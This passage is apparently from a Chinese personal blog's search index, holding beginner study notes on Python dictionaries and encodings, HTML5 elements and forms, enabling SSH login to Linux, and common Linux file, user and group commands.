&#39;瞎折腾....&#39;) for item in dic.items(): key = item[0] value = item[1] print(key,value) #会输出： 赵四 特别能歪嘴 刘能 老，老四啊。。 大脚 跟这个搞对象 大脑袋 瞎折腾.... 12345678910- ```js/python/text for item in dic.items(): key,value = item print(key,value) #会输出： 赵四 特别能歪嘴 刘能 老，老四啊。。 大脚 跟这个搞对象 大脑袋 瞎折腾.... for key,value in dic.items() （***） print(key,value) #会输出： 赵四 特别能歪嘴 刘能 老，老四啊。。 大脚 跟这个搞对象 大脑袋 瞎折腾.... 1234567891011121314151617181920212223242526 #### 嵌套```js/python/textdic = &#123; key1 : value1 key2 : value2 key3 : &#123; key4 : value3 key5 : value4 key6 : &#123; key7 : value5 key8 : value6 key9 : &#123;……&#125; &#125; key10 : [ &#123;key11 : value7,key12 : value8,key13 : value9&#125;, &#123;key14 : value10,key15 : value11,key16 : value12&#125; …… ] &#125;&#125;zzz = dic[key3][key6][key8]print(zzz) #会输出 value6dic[key10][1][key15] = dic[key10][1][key15] + 1 #value为int类型print(dic) #会输出 整个dic，且value11的值+1 循环删除字典在循环中不能直接进行删除操作，会改变字典的大小长度，需要一个新列表存放要删除的数据，再循环列表，删除字典的内容。 1234567891011121314dic = &#123; &quot;赵四&quot;:&quot;特别能歪嘴&quot;, &quot;刘能&quot;:&quot;老，老四啊。。&quot;, &quot;大脚&quot;:&quot;跟这个搞对象&quot;, &quot;大脑袋&quot;:&quot;瞎折腾....&quot;,&#125;temp = [] #存放即将要删除的keyfor key in dic: if key.startswith(&quot;大&quot;): temp.append(key) #dic.pop(key) #dictionary changed size during iterationfor t in temp: #循环列表，删除字典中的内容 dic.pop(t)print(dic) 七、字符集和编码（一）字符集和编码 ascii:8bit,1byte gbk:16bit,2byte windows默认 unicode:32bit,4byte(没法用,只是一个标准) utf-8: mac默认 是可变长的unicode,可以进行数据的传输和储存,最短的字节长度是8 英文:8bit,1byte 欧洲文字:16bit,2byte 中文:24bit,3byte gbk和utf-8 不能直接进行转化 utf-16: 最长的字节长度为16 (二)bytes 程序员平时遇见的所有数据最终单位都是字节byte 12345678910111213141516 s = &quot;周杰伦&quot; bs1 = s.encode(&quot;utf-8&quot;) bs2 = s.encode(&quot;gbk&quot;) # b&#x27;xxxx&#x27; byte类型 print(bs1) print(bs2) #怎么把一个gbk的字节转化为utf-8的字节bs = b&#x27;\\xd6\\xdc\\xbd\\xdc\\xc2\\xd7&#x27;#先变成文字符号（字符串）s = bs.decode(&quot;gbk&quot;) #解码bs2 = s.encode(&quot;utf-8&quot;)# print(bs2)# 1. str.encode(&quot;编码&quot;) 进行编码# 2. bytes.encode(&quot;编码&quot;) 进行解码","path":"2023/12/10/python_study1/","date":"12-10","excerpt":"","tags":[]},{"title":"HTML5的基本知识","text":"一、HTML在VSCODE里面的一些基本用法1. ! +按tab键 2. &lt;title&gt; 标题 3. &lt;body&gt; 网页内容 4. 一些命令的用法 二、Html使用style的四种方法1. 直接在html的标签里加入&lt;header style = &quot;background-color:blue;&quot;&gt;HELLO&lt;/header&gt; 2. 在使用该style的html文本里添加1234567&lt;style&gt; .header&#123; text-align:center; background-color:lightblue; height:50px; &#125;&lt;/style&gt; &lt;header class=&quot;header&quot;&gt;HELLO&lt;/header&gt; 3. 新建一个style.css文档（任意名字，但文件类型一定是.css）,然后在需要使用该style的html文本里将它链接进来1234.header&#123; background-color:red; height:50px;&#125; 然后在html文件中把style.css链接进来 12345678&lt;head&gt;…… &lt;link=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt; &lt;!--将style.css链接进来--&gt; &lt;title&gt;Jan&#x27;s website&lt;/title&gt;&lt;head&gt;&lt;body&gt; &lt;header class=&quot;header&quot;&gt;HELLO&lt;/header&gt;&lt;body&gt; 4. import方法a. 如果有两个css文件，比如一个是header.css,一个是style.css，想要在style.css中调用header.css，可以在style.css文件中将它import进去 @imoort &quot;header.css&quot; b. 在html文件中直接import：@import url(“style.css”)或@import “style.css” 5/text123&lt;style&gt; @import url(&quot;style.css&quot;);&lt;style&gt; 三、HTML超链接1. HTML使用标签 &lt;a&gt; 来设置超文本链接。超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。 当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。 在标签 &lt;a&gt; 中使用了 href 属性来描述链接的地址。 默认情况下，链接将以以下形式出现在浏览器中： 一个未访问过的链接显示为蓝色字体并带有下划线。 访问过的链接显示为紫色并带有下划线。 点击链接时，链接显示为红色并带有下划线。 注意：如果为这些超链接设置了 CSS 样式，展示样式会根据 CSS 的设定而显示。 2. HTML链接语法以下是 HTML 中创建链接的基本语法和属性：&lt;a&gt; 元素：创建链接的主要HTML元素是&lt;a&gt;（锚）元素。&lt;a&gt;元素具有以下属性： href：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。 target（可选）：指定链接如何在浏览器中打开。常见的值包括 _blank（在新标签或窗口中打开链接）和 _self（在当前标签或窗口中打开链接）。 title（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。 rel（可选）：指定与链接目标的关系，如 nofollow、noopener 等。 链接的 HTML 代码很简单，它类似这样：&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt; 提示: “链接文本” 不必一定是文本。图片或其他 HTML 元素都可以成为链接。 示例： 文本链接：最常见的链接类型是文本链接，它使用 &lt;a&gt; 元素将一段文本转化为可点击的链接，例如： 1&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt; 图像链接：您还可以使用图像作为链接。在这种情况下，&lt;a&gt; 元素包围着 &lt;img&gt; 元素。例如： 123&lt;a href=&quot;https://www.example.com&quot;&gt; &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;&lt;/a&gt; 锚点链接：除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 &lt;a&gt; 元素定义一个标记，并使用#符号引用该标记。例如： 123&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;&lt;!-- 在页面中的某个位置 --&gt;&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt; 下载链接：如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如： 1&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt; HTML 链接 - target 属性 使用 target 属性，你可以定义被链接的文档在何处显示。 HTML 链接- id 属性 id 属性可用于创建一个 HTML 文档书签。 提示: 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。 在HTML文档中插入ID: 1&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt; 在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”： 1&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”： 12&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;访问有用的提示部分&lt;/a&gt; 四、HTML表格HTML 表格由 &lt;table&gt;标签来定义。 HTML 表格是一种用于展示结构化数据的标记语言元素。 每个表格均有若干行（由 &lt;tr&gt;标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义），表格可以包含标题行（&lt;th&gt;）用于定义列的标题。 tr：tr 是 table row 的缩写，表示表格的一行。 td：td 是 table data 的缩写，表示表格的数据单元格。 th：th 是 table header的缩写，表示表格的表头单元格。 数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。 123456789101112131415161718192021&lt;table&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;列标题1&lt;/th&gt; &lt;th&gt;列标题2&lt;/th&gt; &lt;th&gt;列标题3&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;行1，列1&lt;/td&gt; &lt;td&gt;行1，列2&lt;/td&gt; &lt;td&gt;行1，列3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;行2，列1&lt;/td&gt; &lt;td&gt;行2，列2&lt;/td&gt; &lt;td&gt;行2，列3&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt;&lt;/table&gt; 以上的表格实例代码中，&lt;table&gt; 元素表示整个表格，它包含两个主要部分：&lt;thead&gt; 和 &lt;tbody&gt;。 &lt;thead &gt; 用于定义表格的标题部分: 在 &lt;thead &gt; 中，使用 &lt;th &gt; 元素定义列的标题，以上实例中列标题分别为”列标题1”，”列标题2”和”列标题3”。 &lt;tbody &gt; 用于定义表格的主体部分: 在&lt;tbody &gt;中，使用&lt;tr &gt;元素定义行，并在每行中使用 &lt;td &gt; 元素定义单元格数据，以上实例中有两行数据，每行包含三个单元格。 通过使用 &lt;th &gt; 元素定义列标题，可以使其在表格中以粗体显示，与普通单元格区分开来。 HTML 表格还可以具有其他部分，如 &lt;tfoot &gt; （表格页脚）和 &lt;caption &gt; （表格标题），&lt;tfoot &gt; 可用于在表格的底部定义摘要、统计信息等内容。 &lt;caption &gt; 可用于为整个表格定义标题。 HTML 表格还支持合并单元格和跨行&#x2F;跨列的操作，以及其他样式和属性的应用，以满足各种需求。 我们也可以使用 CSS 来进一步自定义表格的样式和外观。 五、HTML列表HTML 支持有序、无序和定义列表: 有序列表 无序列表 1.第一个列表项 列表项 2.第二个列表项 列表项 3.第三个列表项 列表项 无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。 无序列表使用 &lt;ul&gt; 标签。每个列表项始于 &lt;li&gt; 标签。 有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 &lt;ol&gt; 标签。每个列表项始于&lt;li&gt;标签。 自定义列表不仅仅是一列项目，而是项目及其注释的组合。 自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以&lt;dt&gt;开始。每个自定义列表项的定义以&lt;dd&gt;开始。 六、HTML区块HTML 可以通过&lt;div&gt;和 &lt;span&gt;将元素组合起来。 块级元素和行内元素： 是块级元素，它独占一行，可以设置宽度、高度以及边距等样式属性。它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。 &lt;span&gt; 是行内元素，它不会独占一行，宽度默认由其内容决定。它适合用于对文本或其他行内元素进行样式化、标记或包裹。 默认样式和布局： 元素的默认样式为块级显示，会以块的形式占据可用空间。 &lt;span&gt; 元素的默认样式为行内显示，它不会独占一行，只占据其内容的宽度。 嵌套关系： 可以容纳其他块级元素和行内元素，包括其他的 和 元素。 &lt;span&gt; 通常被用来包裹文本或其他行内元素，比如用来设置特定文本的样式。 总之，&lt;div&gt; 用于创建页面结构和布局，而 &lt;span&gt; 用于对文本或行内元素进行样式化或包裹。它们在页面设计和样式设置中有不同的用途和作用。 七、HTML表单HTML 表单用于收集用户的输入信息。 HTML 表单表示文档中的一个区域，此区域包含交互控件，将用户收集到的信息发送到 Web 服务器。 HTML 表单通常包含各种输入字段、复选框、单选按钮、下拉列表等元素。 &lt;form&gt; 元素用于创建表单，action 属性定义了表单数据提交的目标 URL，method 属性定义了提交数据的 HTTP 方法（这里使用的是 “post”）。 &lt;label&gt; 元素用于为表单元素添加标签，提高可访问性。 &lt;input&gt; 元素是最常用的表单元素之一，它可以创建文本输入框、密码框、单选按钮、复选框等。type 属性定义了输入框的类型，id 属性用于关联 &lt;label&gt; 元素，name 属性用于标识表单字段。 &lt;select&gt; 元素用于创建下拉列表，而 &lt;option&gt; 元素用于定义下拉列表中的选项。 表单-输入元素多数情况下被用到的表单标签是输入标签 ****。 输入类型是由 type 属性定义。 接下来我们介绍几种常用的输入类型。 1. 文本域（Text Fields）文本域通过&lt;input type=&quot;text&quot;&gt;标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。 **注意:**表单本身并不可见。同时，在大多数浏览器中，文本域的默认宽度是 20 个字符。 2. 密码字段 密码字段通过标签 &lt;input type=&quot;password&quot;&gt; 来定义: 注意：密码字段字符不会明文显示，而是以星号 ***** 或圆点 . 替代。 3. 单选按钮（Radio Buttons） &lt;input type=&quot;radio&quot;&gt;标签定义了表单的单选框选项: 1234&lt;form action=&quot;&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女&lt;/form&gt; 4. 复选框（Checkboxes） &lt;input type=&quot;checkbox&quot;&gt; 定义了复选框。 复选框可以选取一个或多个选项： 1234&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;我喜欢自行车&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;我喜欢小汽车&lt;/form&gt; 5. 提交按钮(Submit) &lt;input type=&quot;submit&quot;&gt; 定义了提交按钮。 当用户单击确认按钮时，表单的内容会被传送到服务器。表单的动作属性 action 定义了服务端的文件名。 action 属性会对接收到的用户输入数据进行相关的处理: 1234&lt;form name=&quot;input&quot; action=&quot;html_form_action.php&quot; method=&quot;get&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;","path":"2023/12/10/HTML5/","date":"12-10","excerpt":"","tags":[]},{"title":"ssh远程登陆Linux","text":"打开Linux系统输入 systemctl enable sshd systemctl start sshd vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config 按esc键，输入 :set nu（显示行号） 找到38行去掉# 在这行末尾没有yes需添加 PermitRootLogin yes systemctl restart sshd ip add(查看ip) 在另外设备上按win+R，输入cmd打开命令行 在命令行输入ssh root@ip（如果报错，可能是防火墙原因，需关闭） 输入Linux系统的密码登录","path":"2023/12/06/ssh_denglu_Linux/","date":"12-06","excerpt":"","tags":[]},{"title":"Linux的学习","text":"相关知识一、Linux目录结构介绍对Linux文件系统目录结构的了解是学习和掌握Linux系统的基础。Linux 文件系统是树形层次结构，具体如下图所示。 二、Linux用户介绍Linux用户通常分为两类: 管理员用户(root也可以叫超级用户)； 普通用户(类似Windows上的普通用户)。 Linux登录系统后，默认当前所在目录为用户主目录，类似Windows登录系统后，默认的所在目录为桌面。 管理员(root)登录系统后默认目录为&#x2F;root； 普通用户登录系统后默认目录为&#x2F;home&#x2F;username， username为用户名。 例如：笔者用普通用户fzm登录系统后，那么当前所在目录为。&#x2F;home&#x2F;fzm。 三、Linux权限说明Linux系统中的每个文件都有访问许可权限，文件的访问权限分为只读，只写和可执行三种。 只读权限表示只允许读其内容，而禁止对其做任何的更改操作。 只写权限表示允许修改文件的内容。 可执行权限表示允许将该文件作为一个程序执行。 每一文件的访问权限都有三组，每组用三位表示，分别为文件所属主的读、写和执行权限；与属主同组的用户的读、写和执行权限；系统中其他用户的读、写和执行权限。 当用ls -l或ll命令显示文件的详细信息时，最左边的一列为文件的访问权限。例如显示test文件详细信息： 四、setuid,setgidLinux中文件&#x2F;目录除了有可读、可写和可执行这三种权限外，还存在比较特殊的权限，这些特殊权限就包括setuid和setgid这两种。 setuid和setgid位是让普通用户可以以root用户的角色运行只有root帐号才能运行的程序或命令。例如我们用普通用户运行passwd命令来更改自己的口令，实际上最终更改的是/etc/passwd文件，我们知道/etc/passwd文件是用户管理的 配置文件，只有root权限的用户才能更改，正是因为passwd命令被设置了setuid权限才能使得普通用户也可以修改其配置文件的内容。 Linux文件&#x2F;目录权限是使用常见的八进制权限掩码来表示的，通常都是用三位数表示，但确切地说，它是用四位数表示的，因为除了读、写和执行权限以外还有特殊的权限。 setuid的八进制表示为4000 setgid的八进制表示为2000 同样setuid和setgid也可以使用字母s表示。 如果文件&#x2F;目录的拥有者的可执行位是s，则表示该文件&#x2F;目录被设置了setuid权限。同样，如果同组用户的可执行为是s，则表示该文件&#x2F;目录被设置了setgid权限。 五、sticky bitLinux中目录除了有可读、可写和可执行这三种权限外，还存在比较特殊的权限，这些特殊权限包括上一关卡讲解的setuid和setgid这两种，还有一种就是本关讲解的**粘滞位sticky bit**。 我们知道Linux的/tmp目录是系统的临时文件目录，所有的用户在该目录下拥有所有的权限，也就是说在该目录下可以任意创建、修改、删除文件，那如果用户A在该目录下创建了一个文件，用户B将该文件删除了，这种情况我们是不能允许的。为了达到该目的，就出现了stick bit（粘滞位）的概念。它是针对目录来说的，如果该目录设置了stick bit（粘滞位），则该目录下的文件除了该文件的创建者和root用户可以删除和修改，别的用户均不能删除和修改，这就是粘滞位的作用。 Linux目录权限使用常见的八进制权限掩码来表示的，通常都是用三位数表示，但确切地说，它是用四位数表示的，因为除了读、写和执行权限以外还有特殊的权限。 sticky bit的八进制表示为1000 同样sticky bit也可以使用字母表示，使用t表示。 如果目录的其他用户的可执行位是t，则表示该目录被设置了sticky bit权限。 接下让我们详细的学习目录的sticky bit的使用方法。 命令使用1.pwd命令pwd(Print Working Directory )：显示当前所在目录。 2.cd命令cd(Change Directory): 切换当前目录。 常用特殊目录表示： cd 进入用户主目录； cd ~ 进入用户主目录； cd - 返回进入此目录之前所在的目录； cd .. 返回上级目录(若当前目录为”&#x2F;“，则执行完后还在”&#x2F;“；”..”为上级目录的意思)； cd ..&#x2F;.. 返回上两级目录； cd !$ 把上个命令的参数作为cd参数使用。 3.ls命令ls(list): 列出指定目录列表信息，如果没有参数默认列出当前目录下的所有文件和文件夹(隐藏文件和文件夹除外)。 常见ls命令选项: -l：以长格式显示目录下的内容列表。输出的信息从左到右依次包括文件名，文件类型、权限模式、硬连接数、所有者、组、文件大小和文件的最后修改时间等； -a：显示所有文件和文件夹(包括隐藏文件&#x2F;文件夹)。 4.创建文件linux中创建文件的常用命令是touch，命令格式如下: touch filename 如果想同时创建多个文件也可以使用touch命令完成，具体格式如下： touch file1 file2 … 5.删除文件Linux中常用的删除文件的命令是rm，使用格式如下： rm [命令选项] filename 常用命令选项： -f：强制删除文件或目录； -r或-R：递归处理，将指定目录下的所有文件与子目录一并处理； -i：删除已有文件或目录之前先询问用户。 6.创建文件夹Linux中创建文件夹命令是mkdir，命令格式如下： mkdir [命令选项] dirname 常用命令选项： -p或–parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录； 7.删除文件夹Linux中删除文件夹的命令是rmdir或者rm -r，命令格式如下： rmdir [命令选项] dirname 常用命令选项：-p或–parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除； 8.Linux文件和文件夹拷贝Linux使用cp命令用来将一个或多个源文件或者目录复制到指定的目录中，命令格式如下： cp [命令选项] 源文件 目的文件 常用命令选项： -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性； -R&#x2F;r：递归处理，将指定目录下的所有文件与子目录一并处理。 9.Linux文件和文件夹移动&#x2F;重命名Linux使用mv命令用来对文件或目录重新命名，或者将文件从一个目录移到另一个目录中，命令格式如下： mv [命令选项] 源文件 目标文件 常用命令选项： -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性； -R&#x2F;r：递归处理，将指定目录下的所有文件与子目录一并处理’。 10.Linux man命令linux中使用man命令来查询命令的帮助文件,命令格式如下: man [章节] command 常用命令如下： d,Ctrl+D:向文件尾部翻半屏； u,Ctrl+U:向文件首部翻半屏； q:退出； #：跳转至第#行； home:回到文件首部； end：翻至文件尾部。 命令的帮助文件通常存放在&#x2F;usr&#x2F;share&#x2F;man目录下。 man包含9个章节，章节用数字表示，分别是： 用户命令 系统调用 C库调用 设备文件及特殊文件 配置文件格式 游戏 杂项 管理类的命令 Linux内核API 如果查询命令的时候不追加章节，则默认从第一个章节开始查询，以此类推，直到找到对应要查询的命令为止。 11.Linux info命令linux中使用info命令来查询命令的帮助文件。info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。 命令格式如下：info [命令参数] command 常用命令参数选项： -d：添加包含info格式帮助文档的目录； -f：指定要读取的info格式的帮助文档； -n：指定首先访问的info帮助文件的节点； -o：输出被选择的节点内容到指定文件。 常见命令如下： ?键：它就会显示info的常用快捷键； N键：显示（相对于本节点的）下一节点的文档内容； P键：显示（相对于本节点的）前一节点的文档内容； U键：进入当前命令所在的主题； M键：敲M键后输入命令的名称就可以查看该命令的帮助文档了； G键：敲G键后输入主题名称，进入该主题； L键：回到上一个访问的页面； SPACE键：向前滚动一页； BACKUP或DEL键：向后滚动一页； Q：退出info。 12.Linux whatis命令whatis用来显示命令的简短描述。 命令格式如下：whatis command 13.Linux创建用户命令Linux中使用useradd命令来创建一个新用户。 命令格式格式：useradd [命令参数] 参数 常见命令参数： -d&lt;登入目录&gt;：指定用户登入时的启始目录； -D：查看或变更预设值； -g&lt;群组&gt;：指定用户所属的群组； -m：自动建立用户的登入目录； -M：不要自动建立用户的登入目录； -s：指定用户登入后所使用的shell。 useradd必须以root权限才能执行，如果是普通用户想创建一个新用户时，需要在命令前加sudo命令来提升权限为root权限。 14.Linux删除用户命令Linux中使用userdel命令来删除一个已经存在的用户。 命令格式：userdel [命令参数] 参数 常见命令参数： -f：强制删除用户，即使用户当前已登录； -r：删除用户的同时，删除与用户相关的所有文件。 userdel必须以root权限才能执行，如果是普通用户想使用该命令时，需要在命令前加sudo命令来提升权限为root权限。 15.使用passwd命令修改用户密码命令格式：passwd [命令参数] 参数 常见命令参数： -d 删除密码； -l 停止账号使用； -S 显示密码信息。 passwd必须以root权限才能执行，如果是普通用户想执行passwd时，需要在命令前加sudo命令来提升权限为root权限。 16.使用chpasswd命令修改用户密码chpasswd命令通常是用于批量修改用户密码，从标准输入批量读取成对的用户名和密码，其中输入的用户名和密码的格式为 用户名:密码 例如要批量更新用户密码，将用户名和密码写入到一个文件中，格式如下所示： 然后执行执行如下命令来更新密码： sudo chpasswd &lt; batch.txt &lt;符号表示输入重定向，接下来的实训中我们会详细的介绍。 命令格式：chpasswd [命令参数] 参数 常见命令参数 -e：输入的密码是加密后的密文； -h：显示帮助信息并退出。 chpasswd必须以root权限才能执行，如果是普通用户执行时，需要在命令前加sudo命令来提升权限为root权限。 17.使用login命令登录login命令是让用户登录系统，可通过它的功能随时更换登入身份。当&#x2F;etc目录里含名称为nologin的文件时，系统只允许root帐号登入系统，其他用户一律不准登入。 当使用login命令登录系统后，可以使用logout命令或者exit命令来退出当前用户登录，返回到登录前的用户状态。 命令格式：login [命令参数] 参数 参数为登录的用户名，可以不输入登录的用户名，直接输入login命令后回车，然后根据提示再输入用户名和密码。 常见命令参数 -p：告诉login指令不销毁环境变量； -h：指定远程服务器的主机名。 login必须以root权限才能执行，如果是普通用户执行时，需要在命令前加sudo命令来提升权限为root权限。 18.使用su命令切换用户身份su命令用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号的密码。 当使用su命令切换用户后，使用exit命令退出当前身份，返回原有登录用户身份。 注：如果当前用户身份是root，则使用su命令切换到其他用户的时候不需要相应用户的密码 命令格式：su [命令参数] 参数 参数为登录的用户名，如果没有参数，则默认切换为root用户。 常见命令参数 -c&lt;指令&gt;或–command&#x3D;&lt;指令&gt;：执行完指定的指令后，即恢复原来的身份； -l或–login：改变身份时，也同时变更工作目录，以及HOME,SHELL,USER,logname。此外，也会变更PATH变量； -m,-p或–preserve-environment：变更身份时，不要变更环境变量； -s或–shell&#x3D;：指定要执行的shell。 su命令所有使用者都可以执行。 19.Linux创建用户组命令Linux 中使用groupadd命令来创建一个新用户组。 命令格式：groupadd [命令参数] 参数 常见命令参数： -g：指定新建工作组的id； -r：创建系统工作组，系统工作组的组ID小于500； groupadd必须以root权限才能执行，如果是普通用户想使用该命令，需要在命令前加sudo命令来提升权限为root权限。 在背景介绍中，我们了解到，Linux中用户组信息是保存在&#x2F;etc&#x2F;group文件中，我们可以使用命令tail &#x2F;etc&#x2F;group命令查看&#x2F;etc&#x2F;group文件最后10行中是否存在刚刚新创建的testGroup用户信息。 注意：我们可以看到有时执行sudo命令就不需要输入密码，这是因为每次都输入密码比较麻烦，所以Linux会设置一个sudo的会话时间，就是说我们在第一次执行sudo的时候是要输入密码，那么在接下来的一段时间内在执行sudo的时候就不需要输入密码，这个会话时间默认是5分钟，用户也可以通过编辑&#x2F;etc&#x2F;sudoers来修改这个会话时间的大小。 20.Linux删除用户组命令Linux 中使用groupdel命令来删除一个已经存在的用户组。 命令格式：groupdel 参数 参数为要删除的用户组名 groupdel必须以root权限才能执行，如果是普通用户想使用该命令，需要在命令前加sudo命令来提升权限为root权限。 22.Linux查看用户所属组Linux中查看一个用户所属的组两种方法。 使用id命令查看。命令格式：id [命令参数] 参数 参数为要查询的用户名，默认是当前登录用户。 常见命令参数： -g或–group：显示用户所属群组的ID； -G或–groups：显示用户所属附加群组的ID； -n或–name：显示用户，所属群组或附加群组的名称。 使用group命令查看。命令格式：groups 参数 参数为要查询的用户名，默认是当前登录用户。 23.Linux修改用户所属组使用usermod命令修改用户组如果要一个用户仅仅属于某一个组，而不是同时属于多个组，则使用如下命令： 命令格式：usermod -g 组名 用户名 如果要给一个用户添加一个新的组，同时保留原来有所的组，则使用如下命令： 命令格式：usermod -a -G 组名 用户名 usermod必须以root权限才能执行，如果是普通用户想执行usermod时，需要在命令前加sudo命令来提升权限为root权限。 使用useradd命令创建用户的时候指定用户组在创建新用户的同时可以修改默认用户所属组，如果想在创建的时候直接将用户所属组修改成系统中已经存在的一个组，而不是使用默认私有组，则使用如下命令： 命令格式：useradd -g 组名 用户名 在创建新用户的同时可以为用户添加其它组，如果想在创建新用户的时候为用户添加一个已经存在的组，而不仅只属于默认创建的私有组，则使用如下命令： 命令格式：useradd -G 组名 用户名 useradd必须以root权限才能执行，如果是普通用户执行时，需要在命令前加sudo命令来提升权限为root权限。 24.Linux查看用户属性命令Linux中使用id命令可以查看用户的大多数信息。具体使用方法请参看上一关的实训。 Linux中还可以通过查看&#x2F;etc&#x2F;passwd文件来获取用户的信息。具体方法可以参考背景知识。 Linux中还可以使用finger命令来查询用户的信息。 注意：Ubuntu系统中默认没有安装finger命令，用户可以通过以下命令来安装finger，然后就可以使用finger。 sudo apt-get install finger 具体使用方法如下： 命令格式：finger [命令参数] 参数 常见命令参数 -l：多行显示； -s：单行显示。这个选项只显示登入名称、真实姓名、终端机名称、闲置时间、登入时间、办公室号码及电话号码。如果所查询的使用者是远端服务器的使用者，这个选项无效。 25.Linux用户信息修改命令Linux 中usermod命令是最强大的用户账户修改实用工具。 usermod命令我们在上一关只是简单的用到其-g、-G参数对用户的所属组进行修改，本关我们将进一步使用usermod命令的其它属性进行修改更多的属性。 命令格式：usermod [命令参数] 参数 常见命令参数： -c&lt;备注&gt;：修改用户帐号的备注文字； -d&lt;登入目录&gt;：修改用户登入时的目录； -e&lt;有效期限&gt;：修改帐号的有效期限； -f&lt;缓冲天数&gt;：修改在密码过期后多少天即关闭该帐号； -g&lt;群组&gt;：修改用户所属的群组； -G&lt;群组&gt;；修改用户所属的附加群组； -l&lt;帐号名称&gt;：修改用户帐号名称； -L：锁定用户密码，使密码无效； -s：修改用户登入后所使用的shell； -u：修改用户ID； -U:解除密码锁定。 usermod必须以root权限才能执行，如果是普通用户想使用该命令时，需要在命令前加sudo命令来提升权限为root权限。 26.Linux用户组信息修改命令Linux 中使用groupmod命令来修改用户组信息。 命令格式：groupmod [命令参数] 参数 常见命令参数： -g&lt;群组识别码&gt;：设置欲使用的群组识别码； -n&lt;新群组名称&gt;：设置欲使用的群组名称。 groupmod必须以root权限才能执行，如果是普通用户想使用该命令时，需要在命令前加sudo命令来提升权限为root权限。 27.Linux创建文件Linux中使用touch命令来创建一个空文件。 具体命令如下：touch 文件名 具体说明： 如果一次想创建多个文件，则每个文件名用空格隔开。 touch命令创建一个指定的新文件，并将当前登录用户作为文件所有者。 由于touch命令创建的文件为空，所以文件的大小为0。 touch命令还可以用于更改文件的访问时间和修改时间，而不改变文件的内容。 28.Linux删除文件Linux中使用rm命令来删除一个已经存在的文件。 具体命令如下：rm 参数 文件名 常用参数如下： -f：强制删除文件或目录； -i：删除已有文件或目录之前先询问用户； -r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；-i：删除已有文件或目录之前先询问用户。 具体说明： 如果一次想删除多个文件，则每个文件名用空格隔开。 rm命令可以使用通配符来删除文件。 29.Linux创建目录Linux中使用mkdir命令来创建一个空目录。 具体命令如下：mkdir 参数 目录名 常用参数如下： -p或–parents：若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录。 具体说明： 如果一次想创建多个目录，则每个目录名用空格隔开。 mkdir命令创建一个指定的目录，并将当前登录用户作为目录所有者。 mkdir命令创建一个空目录后，该目录下只存在两个特殊的目录，分别是.和..。 30.Linux删除目录Linux中使用rmdir命令来删除一个已经存在的空目录。 具体命令如下：rmdir 参数 目录名 常用参数如下： -p或–parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除； 具体说明： 如果一次想删除多个空目录，则每个目录名用空格隔开。 rmdir命令可以使用通配符来删除目录。 如果想删除的目录不为空，则先使用rm命令将目录下的所有文件都清空，然后再使用rmdir将目录删除，或者直接使用rm -r命令直接递归的删除整个目录。 31.Linux拷贝文件Linux中使用cp命令将一个或多个源文件复制到指定的目的目录下。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。 具体命令如下：cp 参数 源文件 目的目录 常用参数如下： -f：强行复制文件或目录，不论目标文件或目录是否已存在； -i：覆盖既有文件之前先询问用户； -p：保留源文件或目录的属性。 具体说明： 